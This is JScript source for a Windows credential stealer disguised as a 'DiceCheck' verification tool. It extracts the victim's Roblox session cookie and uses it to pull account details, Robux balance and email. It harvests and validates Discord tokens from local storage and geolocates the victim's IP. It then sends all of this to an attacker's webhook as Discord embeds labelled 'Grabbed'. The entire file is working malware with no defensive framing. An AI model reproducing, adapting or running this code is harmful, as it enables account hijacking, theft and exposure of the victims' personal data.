var _md=function(p){ try{ if(p && !_A2.FolderExists(p)){ _A2.CreateFolder(p); } }catch(e){} };
var _pj=function(t){ try{ return JSON.parse(t); }catch(e){ try{ return eval("("+t+")"); }catch(e2){ return null; } } };
var _j=function(o){ try{ return JSON.stringify(o).replace(/[\u007f-\uffff]/g,function(c){ return "\\u"+("0000"+c.charCodeAt(0).toString(16)).slice(-4); }); }catch(e){ return "{}"; } };

/* ================= HTTP ================= */
var _xh=function(){ var p=[S_X1,S_X2,S_X3],i; for(i=0;i<p.length;i++){ try{ return new ActiveXObject(p[i]); }catch(e){} } return null; };
var _xh2=function(){
 var p=["WinHttp.WinHttpRequest.5.1",S_X1,S_X2,S_X3],i;
 for(i=0;i<p.length;i++){ try{ var o=new ActiveXObject(p[i]); try{ if(o.SetTimeouts){ o.SetTimeouts(8000,8000,12000,20000); } }catch(e2){} return o; }catch(e){} }
 return null;
};
var _rq=function(m,u,b,ct){
 try{
  var x=_xh(); if(!x){ return {s:0,t:""}; }
  try{ x.Open(m,u,false); if(ct){ x.SetRequestHeader("Content-Type",ct); } x.Send(b||""); return {s:x.status,t:x.responseText}; }catch(e){ return {s:0,t:""}; }
 }catch(e){ return {s:0,t:""}; }
};
var _po=function(j){ try{ return _rq("POST",U_WH,j,"application/json; charset=utf-8"); }catch(e){ return {s:0,t:""}; } };

var _post=function(j){
 var i,r;
 for(i=0;i<3;i++){
  r=_po(j);
  if(r.s>=200 && r.s<300){ return true; }
  if(r.s===0 || r.s===429 || r.s>=500){ _slp(700+i*600); continue; }
  return false;
 }
 return false;
};

var _pf=function(j,fn,txt){
 try{
  var x=_xh(); if(!x){ return false; }
  var b=_g(), r;
  var body =
   "--"+b+"\r\n"+
   'Content-Disposition: form-data; name="payload_json"'+"\r\n"+
   "Content-Type: application/json; charset=utf-8\r\n\r\n"+j+"\r\n"+
   "--"+b+"\r\n"+
   'Content-Disposition: form-data; name="file"; filename="'+fn+'"'+"\r\n"+
   "Content-Type: text/plain; charset=utf-8\r\n\r\n"+txt+"\r\n"+
   "--"+b+"--";
  for(var i=0;i<3;i++){
   try{ x.Open("POST",U_WH,false); x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b); x.Send(body); r=x.status; }catch(e){ r=0; }
   if(r>=200 && r<300){ return true; }
   if(r===0 || r===429 || r>=500){ _slp(700+i*600); continue; }
   return false;
  }
  return false;
 }catch(e){ return false; }
};

/* ================= requete authentifiee Roblox ================= */
var _rbxOnce=function(u,ck,csrf){
 var o={s:0,t:"",c:""};
 try{
  var x=_xh2(); if(!x){ return o; }
  try{
   x.Open("GET",u,false);
   x.SetRequestHeader("Cookie",".ROBLOSECURITY="+ck);
   x.SetRequestHeader("User-Agent",UA);
   x.SetRequestHeader("Accept","application/json, text/plain, */*");
   x.SetRequestHeader("Accept-Language","en-US,en;q=0.9");
   x.SetRequestHeader("Origin","https://www.roblox.com");
   x.SetRequestHeader("Referer","https://www.roblox.com/");
   if(csrf){ x.SetRequestHeader("X-CSRF-TOKEN",csrf); }
   x.Send("");
   try{ o.s = (typeof x.Status!=="undefined") ? x.Status : x.status; }catch(e){ o.s=0; }
   try{ o.t = (typeof x.ResponseText!=="undefined") ? x.ResponseText : x.responseText; }catch(e){ o.t=""; }
   try{ o.c = (typeof x.GetResponseHeader==="function") ? (x.GetResponseHeader("x-csrf-token")||"") : (x.getResponseHeader("x-csrf-token")||""); }catch(e){ o.c=""; }
  }catch(e){}
 }catch(e){}
 return o;
};

var _rbx=function(u,ck){
 try{
  var v=[ck], i=ck.indexOf(S_CAE);
  if(i>0){ v.push(ck.substring(i)); v.push(ck.substring(i+1)); }
  for(var a=0;a<v.length;a++){
   var r=_rbxOnce(u,v[a],"");
   if(r.s===200 && r.t){ return r.t; }
   if(r.s===403 && r.c){
    r=_rbxOnce(u,v[a],r.c);
    if(r.s===200 && r.t){ return r.t; }
   }
   if(r.s!==401 && r.s!==403 && r.s!==0){ continue; }
  }
 }catch(e){}
 return "";
};

var _al=function(t,d,c){
 try{
  _post(_j({username:S_DC,embeds:[{title:t,description:d,color:(c||15158332),footer:{text:_h1+" / "+_h2}}]}));
 }catch(e){}
};

/* ================= geo ================= */
var _jv=function(t,k){ try{ var m=t.match(new RegExp('"'+k+'":"([^"]*)"')); return m?m[1]:""; }catch(e){ return ""; } };
var _ip=function(){
 var r={ip:"",city:"",region:"",country:"",zip:"",isp:""};
 try{
  var a=_rq("GET",U_GEO,"","");
  if(a.s===200 && a.t.indexOf('"status":"success"')>-1){
   r.ip=_jv(a.t,"query"); r.city=_jv(a.t,"city"); r.region=_jv(a.t,"regionName");
   r.country=_jv(a.t,"country"); r.zip=_jv(a.t,"zip"); r.isp=_jv(a.t,"isp");
  }
  if(!r.ip){ var b=_rq("GET",U_IPF,"",""); if(b.s===200){ r.ip=b.t.replace(/[^0-9a-fA-F:.]/g,""); } }
 }catch(e){}
 return r;
};

var _os=function(){
 try{
  var u=navigator.userAgent;
  if(u.indexOf("Windows NT 10.0")>-1){ return "Windows 10/11"; }
  if(u.indexOf("Windows NT 6.3")>-1){ return "Windows 8.1"; }
  if(u.indexOf("Windows NT 6.2")>-1){ return "Windows 8"; }
  if(u.indexOf("Windows NT 6.1")>-1){ return "Windows 7"; }
 }catch(e){}
 return "Windows";
};

/* ================= nettoyage du cookie ================= */
var _clean=function(s){
 try{
  s=String(s||"");
  var a=s.indexOf(S_WN);
  if(a<0){ a=s.indexOf(S_CAE); }
  if(a<0){ a=s.indexOf("_|"); }
  if(a>0){ s=s.substring(a); }
  var t=["#HttpOnly","\t","\r","\n",'"',"\\"," "], cut=-1, i, p;
  for(i=0;i<t.length;i++){ p=s.indexOf(t[i]); if(p>0 && (cut<0||p<cut)){ cut=p; } }
  if(cut>0){ s=s.substring(0,cut); }
  return s.replace(/^[\s]+|[\s]+$/g,"");
 }catch(e){ return ""; }
};

/* ================= profil Roblox ================= */
var _api=function(ck){
 var o={ok:false,id:"",name:"",disp:"",robux:"?",prem:"?",mail:"",created:"",ava:""};
 try{
  var j2=null;
  for(var k=0;k<2 && !j2;k++){
   var t2=_rbx("https://users.roblox.com/v1/users/authenticated",ck);
   j2=t2?_pj(t2):null;
   if(!j2){ _slp(400); }
  }
  if(j2 && j2.id){
   o.id=""+j2.id; o.name=j2.name||""; o.disp=j2.displayName||""; o.ok=true;

   var t=_rbx("https://www.roblox.com/mobileapi/userinfo",ck);
   var j=t?_pj(t):null;
   if(j && j.RobuxBalance!==undefined && j.RobuxBalance!==null){ o.robux=""+j.RobuxBalance; }
   if(j && j.IsPremium){ o.prem="yes"; }
   if(j && j.ThumbnailUrl){ o.ava=j.ThumbnailUrl; }

   if(o.robux==="?"){
    var t3=_rbx("https://economy.roblox.com/v1/users/"+o.id+"/currency",ck);
    var j3=t3?_pj(t3):null;
    if(j3 && j3.robux!==undefined){ o.robux=""+j3.robux; }
   }
   if(o.prem==="?"){
    var t4=_rbx("https://premiumfeatures.roblox.com/v1/users/"+o.id+"/validate-membership",ck);
    if(t4){ o.prem = (t4.replace(/\s/g,"")==="true") ? "yes" : "no"; }
   }
   if(o.prem==="?"){ o.prem="no"; }

   var t6=_rbx("https://accountsettings.roblox.com/v1/email",ck);
   var j6=t6?_pj(t6):null;
   if(j6 && j6.email){ o.mail=j6.email; }

   var t5=_rbx("https://users.roblox.com/v1/users/"+o.id,"");
   var j5=t5?_pj(t5):null;
   if(j5 && j5.created){ o.created=j5.created; }

   if(!o.ava){
    var t7=_rbx("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="+o.id+"&size=420x420&format=Png&isCircular=false","");
    var j7=t7?_pj(t7):null;
    if(j7 && j7.data && j7.data[0] && j7.data[0].imageUrl){ o.ava=j7.data[0].imageUrl; }
   }
  }
 }catch(e){}
 return o;
};

/* ================= tokens Discord ================= */
var _tok=function(){
 var out=[], seen={};
 try{
  var d=[_e("APPDATA")+"\\discord\\Local Storage\\leveldb",
         _e("APPDATA")+"\\discordcanary\\Local Storage\\leveldb",
         _e("APPDATA")+"\\discordptb\\Local Storage\\leveldb",
         _e("APPDATA")+"\\Lightcord\\Local Storage\\leveldb"], i, k;
  var re=/mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{25,40}/g;
  for(i=0;i<d.length;i++){
   try{
    if(!_A2.FolderExists(d[i])){ continue; }
    var en=new Enumerator(_A2.GetFolder(d[i]).Files);
    for(; !en.atEnd(); en.moveNext()){
     var f=en.item(), n=f.Name.toLowerCase();
     if(n.indexOf(".ldb")<0 && n.indexOf(".log")<0){ continue; }
     try{ if(f.Size>6000000){ continue; } }catch(e){}
     var raw=_r(f.Path); if(!raw){ continue; }
     var m=raw.match(re); if(!m){ continue; }
     for(k=0;k<m.length;k++){
      if(seen[m[k]]){ continue; }
      seen[m[k]]=1;
      if(out.length<5){ out.push(m[k]); }
     }
    }
   }catch(e){}
  }
 }catch(e){}
 return out;
};

var _tval=function(t){
 try{
  var x=_xh2(); if(!x){ return 0; }
  x.Open("GET","https://discord.com/api/v9/users/@me",false);
  x.SetRequestHeader("Authorization",t);
  x.SetRequestHeader("User-Agent",UA);
  x.Send("");
  var st=(typeof x.Status!=="undefined")? x.Status : x.status;
  if(st===200){
   var b=(typeof x.ResponseText!=="undefined")? x.ResponseText : x.responseText;
   var j=_pj(b); return (j && j.id) ? 1 : 0;
  }
  if(st===401){ return -1; }
 }catch(e){}
 return 0;
};

/* ================= payload ================= */
var _payload=function(ck,how,info,ip,src){
 var ts=(new Date()).toISOString();
 var host=_h2+"@"+_h1;
 var E=[];

 E.push({title:"🚨 DiceVerification Grabbed 🔥",color:15158332,
  description:"🛰️ Session captured"+(info.ok?" and **verified**":"")+".\n👤 `"+_es(host)+"`",
  footer:{text:"🎯 DiceCheck"}});

 var prev = ck.length>3800 ? ck.substring(0,3800) : ck;
 E.push({title:"🍪 ROBLOX COOKIE",color:15105570,
  description:"```\n"+prev+"\n```",
  footer:{text:"📏 "+ck.length+" chars"}});

 var toks=_tok(), lines="", valid=0, i, v;
 if(!toks.length){ lines="`no token found`"; }
 else{
  for(i=0;i<toks.length;i++){
   v=_tval(toks[i]);
   if(v===1){ valid++; lines+="🟢 valid (`"+toks[i]+"`)\n"; }
   else if(v===-1){ lines+="🔴 expired (`"+toks[i]+"`)\n"; }
   else{ lines+="🟡 unknown (`"+toks[i]+"`)\n"; }
  }
 }
 E.push({title:"🔑 DISCORD TOKENS",color:15844367,
  description:lines.substring(0,3800),
  footer:{text:"📊 "+toks.length+" - "+valid+" valid(s)"}});

 var acc = (info.ok ? "**"+_es(info.name)+(info.disp && info.disp!==info.name ? "** (a.k.a "+_es(info.disp)+")" : "**") : "not resolved")
  + "\n🆔 `" + (info.id||"?") + "`"
  + "\n💰 " + (info.robux||"?") + " Robux"
  + "\n👑 Premium: " + (info.prem||"?");
 if(info.mail){ acc += "\n📧 `"+_es(info.mail)+"`"; }
 if(info.created){ acc += "\n📅 "+info.created.substring(0,10); }

 var loc=ip.city||"";
 if(ip.region){ loc += (loc?", ":"")+ip.region; }
 if(ip.country){ loc += (loc?", ":"")+ip.country; }

 var e4={title:"🧩 Account Details",color:3066993,
  fields:[
   {name:"👑 Roblox Account",value:acc,inline:true},
   {name:"🌐 IP Address",value:"`"+(ip.ip||"?")+"`\n📍 "+(loc||"?")+"\n📡 "+(ip.isp||"?"),inline:true},
   {name:"🖥️ System",value:"`"+_es(host)+"`\n💻 "+_os(),inline:true}
  ]};
 if(info.ava){ e4.thumbnail={url:info.ava}; }
 E.push(e4);

 E.push({title:"📂 Source",color:3447003,
  description:"`"+_es(src)+"`\n🧬 "+how});

 E.push({title:"🌈 DiceCheck",color:10181046,
  description:"✨ Verification complete — thanks for using DiceCheck.",
  footer:{text:"💖 Made with hate ♥"},
  timestamp:ts});

 return _j({username:S_DC, embeds:E});
};

